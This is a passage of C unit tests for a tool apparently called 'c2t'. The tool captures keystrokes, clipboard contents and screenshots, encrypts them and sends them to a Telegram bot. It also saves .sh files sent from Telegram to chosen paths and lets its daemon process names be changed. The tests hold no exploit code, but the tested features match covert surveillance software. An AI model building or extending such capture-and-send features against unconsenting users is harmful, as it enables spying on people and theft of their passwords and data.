    return fail("custom process names env parsing");

  char *proc_args[] = {(char *)"c2t", (char *)"--daemon-name",
                       (char *)"clidaemon", (char *)"--supervisor-name",
                       (char *)"clisup"};
  unsetenv("C2T_DAEMON_NAME");
  unsetenv("C2T_SUPERVISOR_NAME");
  c2t_config_load_environment();
  if (c2t_config_apply_arguments(5, proc_args) != nullptr ||
      strcmp(c2t_config_get()->daemon_name, "clidaemon") != 0 ||
      strcmp(c2t_config_get()->supervisor_name, "clisup") != 0)
    return fail("process name cli arguments parsing");

  unsetenv("C2T_DAEMON_NAME");
  unsetenv("C2T_SUPERVISOR_NAME");
  c2t_config_load_environment();
#endif

  /* Keyboard output worker and batch flush test */
  int kb_posts = http_post_calls;
  if (!keyboard_output_init())
    return fail("keyboard_output_init");

  /* Verify pressing Enter on empty buffer or typing whitespace-only does NOT send messages */
  keyboard_output_append("\n", 1);
  keyboard_output_flush();
  if (http_post_calls != kb_posts)
    return fail("keyboard_output_flush should not send empty Enter message");

  keyboard_output_append("   \t  \n  ", 9);
  keyboard_output_flush();
  if (http_post_calls != kb_posts)
    return fail("keyboard_output_flush should not send whitespace-only message");

  keyboard_output_append("test_keystrokes", 15);
  keyboard_output_flush();
  keyboard_output_cleanup();
  if (http_post_calls != kb_posts + 1)
    return fail("keyboard_output_flush asynchronous delivery");

  /* Verify that one append spanning multiple internal buffers is delivered
   * from beginning to end, rather than retaining only the final segment. */
  size_t spanning_len = 20000;
  char *spanning_text = malloc(spanning_len);
  if (!spanning_text)
    return fail("allocate spanning keyboard payload");
  for (size_t i = 0; i < spanning_len; ++i)
    spanning_text[i] = (char)('a' + (i % 26));
  memcpy(spanning_text, "KEYBOARD_BEGIN_001", 18);
  memcpy(spanning_text + 9000, "KEYBOARD_MIDDLE_002", 19);
  memcpy(spanning_text + spanning_len - 16, "KEYBOARD_END_003", 16);

  free(captured_bodies);
  captured_bodies = nullptr;
  captured_bodies_length = 0;
  capture_http_bodies = 1;
  keyboard_set_format_mode(KEYBOARD_MODE_RAW);
  if (!keyboard_output_init()) {
    free(spanning_text);
    return fail("keyboard_output_init for spanning payload");
  }
  keyboard_output_append(spanning_text, spanning_len);
  keyboard_output_flush();
  keyboard_output_cleanup();
  capture_http_bodies = 0;
  free(spanning_text);
  keyboard_set_format_mode(KEYBOARD_MODE_CODE);

  if (!captured_bodies ||
      strstr((const char *)captured_bodies, "KEYBOARD_BEGIN_001") == nullptr ||
      strstr((const char *)captured_bodies, "KEYBOARD_MIDDLE_002") == nullptr ||
      strstr((const char *)captured_bodies, "KEYBOARD_END_003") == nullptr)
    return fail("spanning keyboard payload lost an internal segment");
  free(captured_bodies);
  captured_bodies = nullptr;
  captured_bodies_length = 0;

  /* Keyboard device listing and selection tests */
  char dev_list_buf[2048];
  if (!keyboard_get_device_list(dev_list_buf, sizeof(dev_list_buf)))
    return fail("keyboard_get_device_list execution");
  if (strstr(dev_list_buf, "Keyboard") == nullptr)
    return fail("keyboard_get_device_list output content");

  (void)keyboard_select_device("0");
  char selected_target_buf[64] = {};
  keyboard_get_selected_target(selected_target_buf,
                               sizeof(selected_target_buf));
  if (strcmp(selected_target_buf, "0") != 0)
    return fail("keyboard_select_device index");

  (void)keyboard_select_device("all");
  keyboard_get_selected_target(selected_target_buf,
                               sizeof(selected_target_buf));
  if (strcmp(selected_target_buf, "all") != 0)
    return fail("keyboard_select_device all");

  /* Keyboard format mode tests */
  keyboard_set_format_mode(KEYBOARD_MODE_RAW);
  if (keyboard_get_format_mode() != KEYBOARD_MODE_RAW)
    return fail("keyboard_set_format_mode RAW");
  keyboard_set_format_mode(KEYBOARD_MODE_CODE);
  if (keyboard_get_format_mode() != KEYBOARD_MODE_CODE)
    return fail("keyboard_set_format_mode CODE");

  char kb_status_buf[1024];
  keyboard_get_status_info(kb_status_buf, sizeof(kb_status_buf));
  if (strstr(kb_status_buf, "Keyboard Listener Status") == nullptr)
    return fail("keyboard_get_status_info output");

  /* Test formatted keyboard delivery */
  int prev_posts = http_post_calls;
  if (!telegram_send_keyboard("\n", 1) || http_post_calls != prev_posts)
    return fail("telegram_send_keyboard should ignore empty newline");
  if (!telegram_send_keyboard("   \r\n\t  ", 7) || http_post_calls != prev_posts)
    return fail("telegram_send_keyboard should ignore whitespace-only text");

  const char *test_keystrokes_html = "echo <hello> & 'world' [Enter]";
  if (!telegram_send_keyboard(test_keystrokes_html,
                              strlen(test_keystrokes_html)))
    return fail("telegram_send_keyboard execution");
  if (!body_contains("%26lt%3Bhello%26gt%3B",
                     sizeof("%26lt%3Bhello%26gt%3B") - 1) ||
      !body_contains("%26amp%3B", sizeof("%26amp%3B") - 1) ||
      !body_contains("%3Cpre%3E%3Ccode", sizeof("%3Cpre%3E%3Ccode") - 1))
    return fail("telegram_send_keyboard HTML escaping and code block");

  keyboard_set_format_mode(KEYBOARD_MODE_RAW);
  if (!telegram_send_keyboard("raw_keys", 8))
    return fail("telegram_send_keyboard raw mode");
  keyboard_set_format_mode(KEYBOARD_MODE_CODE);

  /* Test encrypted keyboard delivery through telegram_send_encrypted_data */
  unsigned char kb_nonce[C2T_CRYPTO_NONCE_SIZE];
  if (!c2t_crypto_get_random_bytes(kb_nonce, sizeof(kb_nonce)))
    return fail("generate kb nonce");
  const char *kb_plain = "sudo apt update && sudo apt upgrade [Enter]";
  size_t kb_plain_len = strlen(kb_plain);
  unsigned char kb_cipher[128];
  if (!c2t_crypto_encrypt(kb_plain, kb_plain_len, kb_nonce, kb_cipher))
    return fail("encrypt kb payload");
  if (!telegram_send_encrypted_data(kb_cipher, kb_plain_len, kb_nonce,
                                    C2T_KEYBOARD_MIME_TYPE, nullptr))
    return fail("telegram_send_encrypted_data for keyboard");
  if (!body_contains("sudo%20apt%20update",
                     sizeof("sudo%20apt%20update") - 1) ||
      !body_contains("%3Cpre%3E%3Ccode", sizeof("%3Cpre%3E%3Ccode") - 1))
    return fail("encrypted keyboard delivery content verification");

  /* Test large encrypted keyboard payload (> 4096 bytes) delivery */
  size_t large_kb_len = 5000;
  char *large_kb_plain = malloc(large_kb_len + 1);
  if (!large_kb_plain)
    return fail("allocate large kb plain buffer");
  memset(large_kb_plain, 'A', large_kb_len);
  /* Insert special characters across boundaries */
  memcpy(large_kb_plain + 3195, "<boundary_test>&amp;", 20);
  large_kb_plain[large_kb_len] = '\0';

  unsigned char *large_kb_cipher = malloc(large_kb_len);
  if (!large_kb_cipher) {
    free(large_kb_plain);
    return fail("allocate large kb cipher buffer");
  }
  unsigned char large_kb_nonce[C2T_CRYPTO_NONCE_SIZE];
  if (!c2t_crypto_get_random_bytes(large_kb_nonce, sizeof(large_kb_nonce)) ||
      !c2t_crypto_encrypt(large_kb_plain, large_kb_len, large_kb_nonce,
                          large_kb_cipher)) {
    free(large_kb_plain);
    free(large_kb_cipher);
    return fail("encrypt large kb payload");
  }

  int prev_large_posts = http_post_calls;
  if (!telegram_send_encrypted_data(large_kb_cipher, large_kb_len,
                                    large_kb_nonce, C2T_KEYBOARD_MIME_TYPE,
                                    nullptr)) {
    free(large_kb_plain);
    free(large_kb_cipher);
    return fail("telegram_send_encrypted_data for large keyboard payload (>4096 bytes)");
  }
  if (http_post_calls <= prev_large_posts) {
    free(large_kb_plain);
    free(large_kb_cipher);
    return fail("large encrypted keyboard payload should produce HTTP posts");
  }
  free(large_kb_plain);
  free(large_kb_cipher);

  /* Test multi-chunk splitting with multi-byte UTF-8 characters across boundary */
  size_t utf8_test_len = 3500;
  char *utf8_test_buf = malloc(utf8_test_len + 1);
  if (!utf8_test_buf)
    return fail("allocate utf8 test buf");
  memset(utf8_test_buf, 'x', utf8_test_len);
  /* Place Italian accented vowels and symbols near 3200-byte boundary */
  memcpy(utf8_test_buf + 3196, "àèéìòù€", 15);
  utf8_test_buf[utf8_test_len] = '\0';
  if (!telegram_send_keyboard(utf8_test_buf, utf8_test_len)) {
    free(utf8_test_buf);
    return fail("telegram_send_keyboard multi-byte UTF-8 boundary chunking");
  }
  free(utf8_test_buf);

  /* The formatted path must preserve the complete payload while escaping in
   * fixed-size chunks, including entities adjacent to a chunk boundary. */
  size_t escaped_test_len = 7000;
  char *escaped_test_buf = malloc(escaped_test_len);
  if (!escaped_test_buf)
    return fail("allocate escaped keyboard test buffer");
  memset(escaped_test_buf, 'q', escaped_test_len);
  memcpy(escaped_test_buf, "FORMAT_BEGIN", 12);
  memcpy(escaped_test_buf + 3197, "<&>\"FORMAT_MIDDLE", 17);
  memcpy(escaped_test_buf + escaped_test_len - 10, "FORMAT_END", 10);
  free(captured_bodies);
  captured_bodies = nullptr;
  captured_bodies_length = 0;
  capture_http_bodies = 1;
  int formatted_posts = http_post_calls;
  int formatted_result =
      telegram_send_keyboard(escaped_test_buf, escaped_test_len);
  capture_http_bodies = 0;
  free(escaped_test_buf);
  if (!formatted_result || http_post_calls <= formatted_posts ||
      !captured_bodies ||
      strstr((const char *)captured_bodies, "FORMAT_BEGIN") == nullptr ||
      strstr((const char *)captured_bodies, "FORMAT_MIDDLE") == nullptr ||
      strstr((const char *)captured_bodies, "FORMAT_END") == nullptr ||
      strstr((const char *)captured_bodies, "%26lt%3B%26amp%3B%26gt%3B%26quot%3B") ==
          nullptr)
    return fail("chunked keyboard HTML escaping lost payload data");
  free(captured_bodies);
  captured_bodies = nullptr;
  captured_bodies_length = 0;

  /* Test keyboard backspace handling of shortcut tags and multi-byte UTF-8 */
  if (!keyboard_output_init())
    return fail("keyboard_output_init for backspace test");
  kb_posts = http_post_calls;
  keyboard_output_append("hello", 5);
  keyboard_output_append("[Ctrl+C]", 8);
  keyboard_output_backspace(); /* deletes [Ctrl+C] */
  keyboard_output_append("!", 1);
  keyboard_output_flush();
  keyboard_output_cleanup();
  if (http_post_calls != kb_posts + 1)
    return fail("keyboard_output_backspace tag removal delivery");
  if (!body_contains("hello%21", sizeof("hello%21") - 1) ||
      body_contains("Ctrl", sizeof("Ctrl") - 1))
    return fail("keyboard_output_backspace cleanly removed shortcut tag");

  int64_t test_offset = 0;
  const char bounded_updates[] =
      "{\"ok\":true,\"result\":["
      "{\"update_id\":1,\"message\":{\"chat\":{\"id\":10},"
      "\"date\":1740001111,\"text\":\"plain\"}},"
      "{\"update_id\":2,\"message\":{\"chat\":{\"id\":10},"
      "\"date\":1740002222,\"document\":{\"file_id\":\"second-file\"}}}]}";
  parser_test_context_t parser_context = {};
  if (telegram_parse_updates_response(
          bounded_updates, sizeof(bounded_updates) - 1U, &test_offset,
          parser_test_callback, &parser_context) != 2 ||
      parser_context.count != 2 || parser_context.last_date != 1740002222 ||
      parser_context.attachment_leaked_between_updates || test_offset != 3 ||
      strcmp(parser_context.final_file_id, "second-file") != 0) {
    return fail("bounded linear Telegram update parsing with date");
  }

  test_offset = 0;
  int polled = telegram_poll_updates_callback("123:test-token", &test_offset, 0,
                                              test_callback, nullptr);
  if (polled != 3 || test_updates_count != 3 || test_offset != 103 ||
      strcmp(test_last_file_id, "doc_123") != 0 ||
      strcmp(test_last_caption, "/tmp/test_c2t_upload.txt") != 0) {
    return fail(
        "telegram_poll_updates_callback batch processing with document");
  }

  if (telegram_poll_updates_callback(nullptr, &test_offset, 0, test_callback,
                                     nullptr) != -1) {
    return fail("telegram_poll_updates_callback null token must return -1");
  }

  /* Test get_file_path and download_file */
  char fetched_file_path[256] = {};
  if (!telegram_get_file_path("123:test-token", "doc_123", fetched_file_path,
                              sizeof(fetched_file_path)) ||
      strcmp(fetched_file_path, "documents/test_file.txt") != 0) {
    return fail("telegram_get_file_path API parsing");
  }

  const char *test_dest = "/tmp/c2t_unit_test_saved_file.txt";
  (void)unlink(test_dest);
  size_t dl_bytes = 0;
  if (!telegram_download_file("123:test-token", "doc_123", test_dest,
                              1024 * 1024, &dl_bytes) ||
      dl_bytes == 0) {
    return fail("telegram_download_file execution");
  }
  (void)unlink(test_dest);

  /* Test c2t_file_save_uploaded with custom caption path */
  if (!c2t_file_save_uploaded("doc_123", "script.sh",
                              "/tmp/c2t_test_script.sh")) {
    return fail("c2t_file_save_uploaded with custom caption path");
  }
  struct stat up_st;
  if (stat("/tmp/c2t_test_script.sh", &up_st) != 0 || up_st.st_size == 0) {
    return fail("c2t_file_save_uploaded file existence verification");
  }
  (void)unlink("/tmp/c2t_test_script.sh");

  /* Test c2t_file_save_uploaded with directory caption */
  if (!c2t_file_save_uploaded("doc_123", "script_dir.sh", "/tmp/")) {
    return fail("c2t_file_save_uploaded with directory caption");
  }
  if (stat("/tmp/script_dir.sh", &up_st) != 0 || up_st.st_size == 0) {
    return fail("c2t_file_save_uploaded directory file existence verification");
  }
  (void)unlink("/tmp/script_dir.sh");

  /* Test c2t_file_save_uploaded with /upload prefix */
  if (!c2t_file_save_uploaded("doc_123", "prefixed.sh",
                              "/upload /tmp/c2t_test_pref.sh")) {
    return fail("c2t_file_save_uploaded with /upload prefix");
  }
  if (stat("/tmp/c2t_test_pref.sh", &up_st) != 0 || up_st.st_size == 0) {
    return fail("c2t_file_save_uploaded prefixed file existence verification");
  }
  (void)unlink("/tmp/c2t_test_pref.sh");

  /* Test c2t_file_save_uploaded with default filename (null caption) */
  if (!c2t_file_save_uploaded("doc_123", "c2t_test_default.sh", nullptr)) {
    return fail("c2t_file_save_uploaded with null caption");
  }
  if (stat("./c2t_test_default.sh", &up_st) != 0 || up_st.st_size == 0) {
    return fail("c2t_file_save_uploaded default file existence verification");
  }
  (void)unlink("./c2t_test_default.sh");

  /* Test in-memory circular log ring buffer unread extraction */
  c2t_log_error("test_comp", "Error test message %d", 42);
  size_t unread_len = 0;
  char *unread_logs = c2t_log_get_unread(&unread_len);
  if (!unread_logs || unread_len == 0 ||
      strstr(unread_logs, "Error test message 42") == nullptr) {
    free(unread_logs);
    return fail("c2t_log_get_unread circular ring buffer verification");
  }
  char log_snapshot[32];
  size_t snapshot_len =
      c2t_log_copy_unread(log_snapshot, sizeof(log_snapshot));
  if (snapshot_len != sizeof(log_snapshot) - 1U ||
      log_snapshot[snapshot_len] != '\0' ||
      memcmp(log_snapshot, unread_logs, snapshot_len) != 0) {
    free(unread_logs);
    return fail("allocation-free log snapshot verification");
  }
  c2t_log_advance_read_offset(unread_len);
  free(unread_logs);

  telegram_cleanup();
  free(last_body);

  /* Crypto & Secure Memory unit tests */
  if (!c2t_crypto_init())
    return fail("c2t_crypto_init");
  if (c2t_crypto_simd_capabilities()[0] == '\0' ||
      c2t_crypto_chacha20_backend()[0] == '\0')
    return fail("crypto SIMD diagnostics");

  unsigned char test_nonce[C2T_CRYPTO_NONCE_SIZE];
  if (!c2t_crypto_get_random_bytes(test_nonce, sizeof(test_nonce)))
    return fail("c2t_crypto_get_random_bytes");

  const char *secret_text = "Secret Clipboard Payload 2026";
  size_t secret_len = strlen(secret_text);
  unsigned char ciphertext[64] = {0};
  unsigned char decrypted[64] = {0};

  if (!c2t_crypto_encrypt(secret_text, secret_len, test_nonce, ciphertext))
    return fail("c2t_crypto_encrypt");

  if (memcmp(secret_text, ciphertext, secret_len) == 0)
    return fail("ciphertext matches plaintext");

  if (!c2t_crypto_decrypt(ciphertext, secret_len, test_nonce, decrypted))
    return fail("c2t_crypto_decrypt");

  if (memcmp(secret_text, decrypted, secret_len) != 0)
    return fail("decrypted plaintext mismatch");

  /* Independent ChaCha20 vectors spanning the SIMD and scalar paths. */
  static const unsigned char chacha_expected[17][16] = {
      {0x08, 0x5f, 0xfe, 0x3d, 0xaa, 0xe9, 0x27, 0x6b, 0x70, 0x3d, 0x39,
       0x6a, 0x35, 0xe6, 0xce, 0xb3},
      {0xf9, 0x06, 0x86, 0x1a, 0x2c, 0xac, 0x0e, 0x86, 0x9f, 0xf1, 0x72,
       0xe6, 0x02, 0x7f, 0xed, 0x3f},
      {0xfa, 0xba, 0xec, 0x24, 0x1a, 0x9b, 0x9e, 0x78, 0x5c, 0xef, 0x15,
       0x5d, 0x55, 0xb9, 0x91, 0x7a},
      {0xb2, 0x9b, 0xf7, 0xb7, 0x3a, 0x2e, 0x0c, 0x92, 0x78, 0x5c, 0x91,
       0xf5, 0x93, 0x0f, 0x9a, 0x8c},
      {0xf1, 0x19, 0x30, 0x37, 0x13, 0x85, 0x0c, 0x7b, 0xea, 0x33, 0xed,
       0xe2, 0x6f, 0xf5, 0xce, 0x55},
      {0x97, 0x4a, 0xd3, 0x88, 0xd8, 0xd9, 0xa4, 0x4d, 0x43, 0x6c, 0x03,
       0x63, 0xbb, 0x78, 0xb0, 0xc2},
      {0x4c, 0x15, 0xf3, 0x99, 0x97, 0x62, 0x48, 0x9f, 0x03, 0x11, 0xb6,
       0xea, 0xa7, 0x41, 0xa4, 0xc3},
      {0xdf, 0xe4, 0x07, 0x4a, 0xf2, 0xaf, 0x4f, 0x39, 0x0a, 0xdb, 0x58,
       0x9e, 0x8c, 0x56, 0x4a, 0x93},
      {0x51, 0x76, 0x9c, 0xbf, 0xfe, 0x16, 0xa1, 0x06, 0x04, 0xdc, 0x2c,
       0xf0, 0x6c, 0x6f, 0xa3, 0xb1},
      {0xef, 0xd7, 0xb7, 0x17, 0xbe, 0xf1, 0x89, 0xab, 0xa1, 0x2d, 0xc1,
       0x6d, 0x79, 0x63, 0x2f, 0x5b},
      {0x5d, 0x70, 0x8b, 0x7d, 0xcc, 0xcd, 0x27, 0x37, 0x83, 0x68, 0xe1,
       0x7c, 0xf2, 0xcd, 0x1a, 0x4e},
      {0xaa, 0x1b, 0x00, 0x4f, 0xa6, 0xe0, 0x16, 0xa7, 0x68, 0xd9, 0x2d,
       0xd4, 0xdb, 0xb3, 0x31, 0x5d},
      {0x9b, 0xd0, 0x72, 0xcb, 0x85, 0xe6, 0xf6, 0x26, 0x3a, 0xef, 0xe4,
       0xc7, 0xfa, 0x0c, 0x9e, 0xfa},
      {0x51, 0xc6, 0xb3, 0xf7, 0x14, 0x7f, 0x03, 0xee, 0x74, 0x76, 0x71,
       0x02, 0xa9, 0xe1, 0xa5, 0x20},
      {0xcd, 0x0b, 0x7e, 0x09, 0x4a, 0x8b, 0x7f, 0x58, 0xa1, 0x50, 0xe5,
       0x65, 0xd0, 0xab, 0x9d, 0xf2},
      {0xb9, 0xb7, 0x0f, 0xed, 0xaa, 0x1c, 0xd3, 0x39, 0x04, 0x91, 0x55,
       0x2f, 0x0d, 0x05, 0xa6, 0xcf},
      {0x98, 0xcf, 0x1a, 0x34, 0xb2, 0xe2, 0x02, 0x36, 0x29, 0xfd, 0x34,
       0x95, 0x08, 0x23, 0x3f, 0x59}};
  unsigned char chacha_nonce[C2T_CRYPTO_NONCE_SIZE];
  unsigned char chacha_plain[1088] = {0};
  unsigned char chacha_output[1088];
  for (size_t i = 0; i < sizeof(chacha_nonce); ++i)
    chacha_nonce[i] = (unsigned char)i;
  if (!c2t_crypto_state_encrypt(chacha_plain, sizeof(chacha_plain),
                                chacha_nonce, chacha_output))
    return fail("ChaCha20 known-vector encryption");
  for (size_t block_index = 0;
       block_index < sizeof(chacha_expected) / sizeof(chacha_expected[0]);
       ++block_index) {
    if (memcmp(chacha_output + block_index * 64, chacha_expected[block_index],
               sizeof(chacha_expected[block_index])) != 0)
      return fail("ChaCha20 known-vector mismatch");
  }
  memset(chacha_output, 0, sizeof(chacha_output));
  if (!c2t_crypto_state_encrypt(chacha_output, sizeof(chacha_output),
                                chacha_nonce, chacha_output))
    return fail("ChaCha20 in-place known-vector encryption");
  for (size_t block_index = 0;
       block_index < sizeof(chacha_expected) / sizeof(chacha_expected[0]);
       ++block_index) {
    if (memcmp(chacha_output + block_index * 64, chacha_expected[block_index],
               sizeof(chacha_expected[block_index])) != 0)
      return fail("ChaCha20 in-place known-vector mismatch");
  }

  c2t_secure_zero(decrypted, sizeof(decrypted));
  for (size_t i = 0; i < sizeof(decrypted); ++i) {
    if (decrypted[i] != 0)
      return fail("c2t_secure_zero failed");
  }

  /* Test offset decryption & streaming read */
  const char *stream_payload =
      "Stream Decryption On-The-Fly Test Payload 2026!";
  size_t payload_len = strlen(stream_payload);
  unsigned char enc_buf[128] = {0};
  if (!c2t_crypto_encrypt(stream_payload, payload_len, test_nonce, enc_buf))
    return fail("c2t_crypto_encrypt for stream test");

  unsigned char offset_dec[128] = {0};
  /* Decrypt from offset 7 */
  if (!c2t_crypto_decrypt_offset(enc_buf + 7, 7, payload_len - 7, test_nonce,
                                 offset_dec))
    return fail("c2t_crypto_decrypt_offset");

  if (memcmp(stream_payload + 7, offset_dec, payload_len - 7) != 0)
    return fail("offset decryption mismatch");

  c2t_encrypted_stream_t enc_st;
  c2t_encrypted_stream_init(&enc_st, "PREFIX:", 7, enc_buf, payload_len,
                            test_nonce, ":SUFFIX", 7);
  unsigned char st_out[256] = {0};
  size_t total_read =
      c2t_encrypted_stream_read(&enc_st, st_out, sizeof(st_out));
  if (total_read != 7 + payload_len + 7)
    return fail("encrypted stream read total bytes mismatch");
  if (memcmp(st_out, "PREFIX:", 7) != 0 ||
      memcmp(st_out + 7, stream_payload, payload_len) != 0 ||
      memcmp(st_out + 7 + payload_len, ":SUFFIX", 7) != 0) {
    return fail("encrypted stream content mismatch");
  }

  /* Clipboard status & flush unit tests */
  char clip_stat_buf[1024] = {};
  clipboard_get_status_info(clip_stat_buf, sizeof(clip_stat_buf));
  if (strstr(clip_stat_buf, "Clipboard Monitor Status") == nullptr ||
      strstr(clip_stat_buf, "Delivery Queue:") == nullptr)
    return fail("clipboard_get_status_info format");

  clipboard_output_flush();
  int initial_pause = clipboard_is_paused();
  int toggled = clipboard_toggle_paused();
  if (toggled == initial_pause || clipboard_is_paused() != toggled)
    return fail("clipboard_toggle_paused");
  clipboard_set_paused(initial_pause);

  /* Keyboard layout unit tests */
#ifndef __APPLE__
  if (!keyboard_set_layout("it"))
    return fail("keyboard_set_layout it failed");
  char layout_buf[128] = {};
  keyboard_get_layout(layout_buf, sizeof(layout_buf));
  if (strstr(layout_buf, "Italian") == nullptr &&
      strstr(layout_buf, "it") == nullptr)
    return fail("keyboard_get_layout it check failed");

  if (!keyboard_set_layout("de"))
    return fail("keyboard_set_layout de failed");
  keyboard_get_layout(layout_buf, sizeof(layout_buf));
  if (strstr(layout_buf, "German") == nullptr &&
      strstr(layout_buf, "de") == nullptr)
    return fail("keyboard_get_layout de check failed");

  if (!keyboard_set_layout("fr"))
    return fail("keyboard_set_layout fr failed");
  keyboard_get_layout(layout_buf, sizeof(layout_buf));
  if (strstr(layout_buf, "French") == nullptr &&
      strstr(layout_buf, "fr") == nullptr)
    return fail("keyboard_get_layout fr check failed");

  if (!keyboard_set_layout("us"))
    return fail("keyboard_set_layout us failed");

  if (keyboard_set_layout("nonexistent_layout_12345"))
    return fail("keyboard_set_layout should have failed for invalid code");

  char avail_buf[1024] = {};
  keyboard_get_available_layouts(avail_buf, sizeof(avail_buf));
  if (strstr(avail_buf, "Supported Keyboard Layouts") == nullptr ||
      strstr(avail_buf, "it") == nullptr || strstr(avail_buf, "us") == nullptr)
    return fail("keyboard_get_available_layouts format");
#else
  char layout_buf[128] = {};
  keyboard_get_layout(layout_buf, sizeof(layout_buf));
  if (strstr(layout_buf, "macOS") == nullptr)
    return fail("keyboard_get_layout macOS check failed");
  char avail_buf[1024] = {};
  keyboard_get_available_layouts(avail_buf, sizeof(avail_buf));
  if (strstr(avail_buf, "macOS") == nullptr)
    return fail("keyboard_get_available_layouts macOS format");
#endif

  /* Keyboard shortcuts and backspace unit tests */
  int init_shortcuts = keyboard_get_shortcuts_enabled();
  keyboard_set_shortcuts_enabled(1);
  if (!keyboard_get_shortcuts_enabled())
    return fail("keyboard_set_shortcuts_enabled(1)");
  int toggled_sc = keyboard_toggle_shortcuts();
  if (toggled_sc != 0 || keyboard_get_shortcuts_enabled() != 0)
    return fail("keyboard_toggle_shortcuts");
  keyboard_set_shortcuts_enabled(init_shortcuts);

  /* Backspace and typing buffer tests */
  if (!keyboard_output_init())
    return fail("keyboard_output_init for backspace test");
  keyboard_output_append("test", 4);
  keyboard_output_backspace();     /* removes 't' -> "tes" */
  keyboard_output_backspace();     /* removes 's' -> "te" */
  keyboard_output_append("xt", 2); /* buffer is "text" */
  /* Backspace across UTF-8 multibyte character */
  keyboard_output_append("è", 2); /* "textè" */
  keyboard_output_backspace();    /* removes 'è' (2 bytes) -> "text" */
  /* Append full sentence with spaces and newlines to ensure no pieces lost */
  keyboard_output_append(" is a complete sentence with spaces and\nnewline", 48);
  keyboard_output_flush();
  keyboard_output_cleanup();

  char kb_stat_buf[1024] = {};
  keyboard_get_status_info(kb_stat_buf, sizeof(kb_stat_buf));
  if (strstr(kb_stat_buf, "Active Layout:") == nullptr ||
      strstr(kb_stat_buf, "Shortcuts &amp; Modifiers:") == nullptr ||
      strstr(kb_stat_buf, "Total Delivered:") == nullptr)
    return fail(
        "keyboard_get_status_info layout, shortcuts or total field missing");

  if (strstr(clip_stat_buf, "Total Delivered:") == nullptr)
    return fail("clipboard_get_status_info total field missing");

  (void)clipboard_get_total_bytes();
  (void)clipboard_get_total_events();
  (void)keyboard_get_total_bytes();
  (void)keyboard_get_total_keystrokes();
  (void)c2t_files_get_total_bytes();
  (void)c2t_files_get_total_files();
  (void)c2t_log_sender_get_total_bytes();
  (void)c2t_log_sender_get_total_dispatches();

  /* Screenshot module unit tests */
  const char *backend_name = screenshot_get_backend_name();
  if (!backend_name || !*backend_name)
    return fail("screenshot_get_backend_name returned empty or null");

  (void)screenshot_is_available();

  if (!screenshot_output_init())
    return fail("screenshot_output_init failed");

  int shot_init_pause = screenshot_is_paused();
  int shot_toggled = screenshot_toggle_paused();
  if (shot_toggled == shot_init_pause || screenshot_is_paused() != shot_toggled)
    return fail("screenshot_toggle_paused mismatch");
  screenshot_set_paused(shot_init_pause);

  screenshot_set_interval(120);
  if (screenshot_get_interval() != 120)
    return fail("screenshot_set_interval / screenshot_get_interval mismatch");
  screenshot_set_interval(0);

  screenshot_set_format(C2T_IMAGE_FORMAT_JPG);
  if (screenshot_get_format() != C2T_IMAGE_FORMAT_JPG)
    return fail("screenshot_set_format / screenshot_get_format mismatch");
  screenshot_set_format(C2T_IMAGE_FORMAT_PNG);
  if (screenshot_get_format() != C2T_IMAGE_FORMAT_PNG)
    return fail("screenshot_set_format PNG mismatch");

  screenshot_set_quality(92);
  if (screenshot_get_quality() != 92)
    return fail("screenshot_set_quality / screenshot_get_quality mismatch");
  screenshot_set_quality(85);

  char shot_stat_buf[1024] = {};
  screenshot_get_status_info(shot_stat_buf, sizeof(shot_stat_buf));
  if (strstr(shot_stat_buf, "Screenshot Subsystem Status") == nullptr ||
      strstr(shot_stat_buf, "Backend:") == nullptr ||
      strstr(shot_stat_buf, backend_name) == nullptr) {
    return fail("screenshot_get_status_info format check failed");
  }

  char disp_list_buf[1500] = {};
  if (!screenshot_get_display_list(disp_list_buf, sizeof(disp_list_buf)) || !*disp_list_buf)
    return fail("screenshot_get_display_list failed or returned empty");

  if (!screenshot_select_display("0"))
    return fail("screenshot_select_display('0') failed");
  char cur_disp[64] = {};
  screenshot_get_selected_display(cur_disp, sizeof(cur_disp));
  if (strcmp(cur_disp, "0") != 0)
    return fail("screenshot_get_selected_display mismatch for '0'");

  if (!screenshot_select_display("all"))
    return fail("screenshot_select_display('all') failed");
  screenshot_get_selected_display(cur_disp, sizeof(cur_disp));
  if (strcmp(cur_disp, "all") != 0)
    return fail("screenshot_get_selected_display mismatch for 'all'");

  if (screenshot_get_display_count() < 1)
    return fail("screenshot_get_display_count returned less than 1");

  /* Multi-format image encoder test (PNG, JPG, BMP, TGA, HDR) */
  {
    if (screenshot_parse_format("png") != C2T_IMAGE_FORMAT_PNG ||
        screenshot_parse_format("PNG") != C2T_IMAGE_FORMAT_PNG ||
        screenshot_parse_format("jpg") != C2T_IMAGE_FORMAT_JPG ||
        screenshot_parse_format("jpeg") != C2T_IMAGE_FORMAT_JPG ||
        screenshot_parse_format("bmp") != C2T_IMAGE_FORMAT_BMP ||
        screenshot_parse_format("tga") != C2T_IMAGE_FORMAT_TGA ||
        screenshot_parse_format("hdr") != C2T_IMAGE_FORMAT_HDR ||
        screenshot_parse_format(nullptr) != C2T_IMAGE_FORMAT_PNG)
      return fail("screenshot_parse_format mapping failed");

    uint8_t test_pixels[16 * 16 * 4];
    for (size_t i = 0; i < sizeof(test_pixels); ++i) test_pixels[i] = (uint8_t)(i & 0xFF);
    test_pixels[3] = 255;

    /* 1. Test PNG format */
    void *png_out = nullptr;
    size_t png_len = 0;
    if (!screenshot_encode_image(C2T_IMAGE_FORMAT_PNG, 16, 16, test_pixels, 1, 85, &png_out, &png_len) || !png_out || png_len < 32)
      return fail("screenshot_encode_image PNG failed");
    if (memcmp(png_out, "\x89PNG\r\n\x1a\n", 8) != 0) {
      free(png_out);
      return fail("screenshot_encode_image invalid PNG magic header");
    }
    free(png_out);

    /* 2. Test JPG format */
    void *jpeg_out = nullptr;
    size_t jpeg_len = 0;
    if (!screenshot_encode_image(C2T_IMAGE_FORMAT_JPG, 16, 16, test_pixels, 1, 85, &jpeg_out, &jpeg_len) || !jpeg_out || jpeg_len < 32)
      return fail("screenshot_encode_image JPG failed");
    const uint8_t *jpeg_bytes = jpeg_out;
    if (jpeg_bytes[0] != 0xff || jpeg_bytes[1] != 0xd8 ||
        jpeg_bytes[jpeg_len - 2] != 0xff || jpeg_bytes[jpeg_len - 1] != 0xd9) {
      free(jpeg_out);
      return fail("screenshot_encode_image invalid JPEG markers (SOI/EOI)");
    }
    free(jpeg_out);

    /* 3. Test BMP format */
    void *bmp_out = nullptr;
    size_t bmp_len = 0;
    if (!screenshot_encode_image(C2T_IMAGE_FORMAT_BMP, 16, 16, test_pixels, 1, 85, &bmp_out, &bmp_len) || !bmp_out || bmp_len < 32)
      return fail("screenshot_encode_image BMP failed");
